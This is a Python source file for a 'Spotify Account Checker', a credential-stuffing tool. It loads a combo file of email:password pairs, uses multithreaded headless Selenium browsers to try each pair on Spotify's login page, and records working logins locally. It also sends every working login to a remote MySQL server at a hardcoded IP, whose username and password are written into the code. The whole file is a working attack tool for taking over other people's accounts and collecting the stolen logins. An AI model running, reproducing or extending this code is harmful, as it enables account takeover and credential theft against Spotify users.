import mysql.connector
import time
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, PhotoImage, Menu
import threading
import os
import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from colorama import Fore, Back
import colorama


def connect_to_database():
    try:
        global connection
        connection = mysql.connector.connect(
            host="37.187.149.30",
            port="3306",
            user="u5266_hxP3EYoA3j",
            password="62csHC6Qk^yA=5BFtSz^9bf@",
            database="s5266_Checker"
        )

        if connection.is_connected():
            print("Connected to the database.")
            return connection
    except mysql.connector.Error as e:
        print("Error connecting to the database:", e)
        return None

def check_credentials(username, password):
    connection = connect_to_database()
    if connection:
        try:
            cursor = connection.cursor()
            query = "SELECT * FROM users WHERE username = %s AND password = %s"
            data = (username, password)
            cursor.execute(query, data)
            result = cursor.fetchall()  
            return bool(result)  
        except mysql.connector.Error as e:
            print(f"Database error: {e}")
        finally:
            if cursor:
                cursor.close()
            if connection.is_connected():
                connection.close()
    return False

colorama.init(autoreset=True)

options = webdriver.ChromeOptions()

options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--incognito")
options.add_argument('--disable-extensions')
options.add_experimental_option('excludeSwitches', ['enable-logging'])

url = 'https://accounts.spotify.com/pt-BR/login'  



def check_account(account, gui_output, results_file_name):
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    driver.implicitly_wait(30)

    email, password = account.split(':')

    
    driver.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
    driver.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
    driver.find_element(By.CSS_SELECTOR, '#login-button').click()

    time.sleep(1.7)  
    if driver.current_url == "https://accounts.spotify.com/pt-BR/status":
        gui_output.insert(tk.END, f"[VALID] {email}:{password}\n")
        with open(results_file_name, 'a') as file:
            file.write(f"{email}:{password}\n")
            
        insert_into_database(email, password)
        
    else:
        gui_output.insert(tk.END, f"[INVALID] {email}:{password}\n")

    gui_output.see(tk.END)  
    driver.close()

def insert_into_database(username, password):
    connection = connect_to_database()
    if connection:
        try:
            cursor = connection.cursor()
            query = "INSERT INTO success_spotify (username, password) VALUES (%s, %s)"
            data = (username, password)
            cursor.execute(query, data)
            connection.commit()  
        except mysql.connector.Error as e:
            print(f"Database error: {e}")
        finally:
            if cursor:
                cursor.close()
            if connection.is_connected():
                connection.close()


def start_checking(accounts, gui_output, max_threads):
    results_file_name = f'results-{datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt'
    if not os.path.exists('results'):
        os.mkdir('results')

    def thread_target(account):
        check_account(account, gui_output, os.path.join('results', results_file_name))
    
    threads = []
    for account in accounts:
        while len(threads) >= max_threads:
            for t in threads:
                if not t.is_alive():
                    threads.remove(t)
            time.sleep(0.5)  
        thread = threading.Thread(target=thread_target, args=(account,))
        thread.start()
        threads.append(thread)
        time.sleep(0.5)  
    for t in threads:  
        t.join()
    
    messagebox.showinfo("Complete", "Account checking complete.")



def toggle_theme():
    current_theme = root.cget('bg')
    if current_theme == 'white':  
        root.configure(bg='black')
        for widget in root.winfo_children():
            if isinstance(widget, tk.Label) or isinstance(widget, tk.Button):
                widget.configure(bg='black', fg='white')
            if isinstance(widget, tk.Entry) or isinstance(widget, scrolledtext.ScrolledText):
                widget.configure(bg='grey', fg='white', insertbackground='white')
            if isinstance(widget, tk.Frame):
                widget.configure(bg='black')
                for child in widget.winfo_children():
                    if isinstance(child, tk.Label) or isinstance(child, tk.Button):
                        child.configure(bg='black', fg='white')
                    if isinstance(child, tk.Entry) or isinstance(child, scrolledtext.ScrolledText):
                        child.configure(bg='grey', fg='white', insertbackground='white')
    else:  
        root.configure(bg='white')
        for widget in root.winfo_children():
            if isinstance(widget, tk.Label) or isinstance(widget, tk.Button):
                widget.configure(bg='white', fg='black')
            if isinstance(widget, tk.Entry) or isinstance(widget, scrolledtext.ScrolledText):
                widget.configure(bg='white', fg='black', insertbackground='black')
            if isinstance(widget, tk.Frame):
                widget.configure(bg='white')
                for child in widget.winfo_children():
                    if isinstance(child, tk.Label) or isinstance(child, tk.Button):
                        child.configure(bg='white', fg='black')
                    if isinstance(child, tk.Entry) or isinstance(child, scrolledtext.ScrolledText):
                        child.configure(bg='white', fg='black', insertbackground='black')


def show_help():
    messagebox.showinfo("Help", "This application checks Spotify accounts.\n\nFor assistance, contact support.")


def setup_gui():
    global root  
    root = tk.Tk()
    root.geometry("500x300+500+100")
    root.title("Spotify Account Checker")
    root.configure(bg='white')  

   
    menubar = Menu(root)
    root.config(menu=menubar)

    
    file_menu = Menu(menubar, tearoff=0)
    menubar.add_cascade(label="File", menu=file_menu)
    file_menu.add_command(label="Exit", command=root.quit)

    
    theme_menu = Menu(menubar, tearoff=0)
    menubar.add_cascade(label="Themes", menu=theme_menu)
    theme_menu.add_command(label="Black on White", command=lambda: toggle_theme())
    theme_menu.add_command(label="White on Black", command=lambda: toggle_theme())

    
    help_menu = Menu(menubar, tearoff=0)
    menubar.add_cascade(label="Help", menu=help_menu)
    help_menu.add_command(label="About", command=show_help)

    
    def login():
        username = username_entry.get()
        password = password_entry.get()
        if check_credentials(username, password):
            start_button.config(state=tk.NORMAL)
            login_frame.pack_forget()
            main_frame.pack()
        else:
            messagebox.showerror("Error", "Invalid username or password.")

    
    root.configure(bg="#f0f0f0")
    login_frame = tk.Frame(root, bg="#ffffff", padx=20, pady=20)
    main_frame = tk.Frame(root, bg="#ffffff", padx=20, pady=20)

   
    logo_label = tk.Label(login_frame, text="Login Interface", font=("Helvetica", 24), bg="#ffffff")
    logo_label.pack(pady=10)

    
    username_label = tk.Label(login_frame, text="Username:", font=("Helvetica", 12), bg="#ffffff")
    username_label.pack(anchor="w")

    username_entry = tk.Entry(login_frame, font=("Helvetica", 12))
    username_entry.pack(pady=5, padx=10, ipady=3, fill=tk.X)

    
    password_label = tk.Label(login_frame, text="Password:", font=("Helvetica", 12), bg="#ffffff")
    password_label.pack(anchor="w")

    password_entry = tk.Entry(login_frame, show="*", font=("Helvetica", 12))
    password_entry.pack(pady=5, padx=10, ipady=3, fill=tk.X)

    
    login_button = tk.Button(login_frame, text="Login", font=("Helvetica", 12), command=login, bg="#007bff", fg="#ffffff", relief=tk.FLAT)
    login_button.pack(pady=10, padx=10, ipadx=10, ipady=3, fill=tk.X)

    login_frame.pack(fill=tk.BOTH, expand=True)
    

    
    def select_combo_file():
        filename = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text files", "*.txt")])
        combo_entry.delete(0, tk.END)
        combo_entry.insert(0, filename)

    main_frame = tk.Frame(root)

    combo_label = tk.Label(main_frame, text="Combo File:")
    combo_label.pack()

    combo_frame = tk.Frame(main_frame)
    combo_frame.pack(fill=tk.X)

    combo_entry = tk.Entry(combo_frame)
    combo_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

    combo_button = tk.Button(combo_frame, text="Browse", command=select_combo_file)
    combo_button.pack(side=tk.RIGHT)

    
    thread_label = tk.Label(main_frame, text="Max Threads:")
    thread_label.pack()

    thread_spinbox = tk.Spinbox(main_frame, from_=1, to=10, width=5)
    thread_spinbox.pack()

    
    def start_button_command():
        combo_path = combo_entry.get()
        max_threads = int(thread_spinbox.get())
        if not os.path.exists(combo_path):
            messagebox.showerror("Error", "Combo file does not exist.")
            return
        with open(combo_path, 'r') as file:
            accounts = [line.strip() for line in file.readlines() if line.strip()]
        threading.Thread(target=start_checking, args=(accounts, output_text, max_threads)).start()

    start_button = tk.Button(main_frame, text="Start Checking", command=start_button_command, state=tk.DISABLED)
    start_button.pack(pady=10)

    
    output_text = scrolledtext.ScrolledText(main_frame, height=15)
    output_text.pack(fill=tk.BOTH, expand=True)

    root.mainloop()

if __name__ == "__main__":
    setup_gui()